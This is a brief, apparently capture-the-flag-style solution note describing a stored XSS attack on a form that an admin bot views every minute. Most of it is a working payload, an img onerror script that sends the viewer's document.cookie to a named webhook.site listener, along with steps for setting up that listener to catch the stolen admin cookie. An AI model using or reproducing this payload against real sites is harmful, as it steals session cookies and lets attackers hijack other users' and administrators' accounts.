Get a dummy server here or anything to listen for requests
https://webhook.site/

Add xss script to the form data
<img src=x onerror="this.src=' https://webhook.site/80d09e24-2b3c-440c-aba5-a63ac53515a8/?'+document.cookie; this.removeAttribute('onerror');">

Cronjob/admin is set to load the admin page every minute. Triggers the script and will send a request with the cookie as paramter to the dummy server.

Easy clap
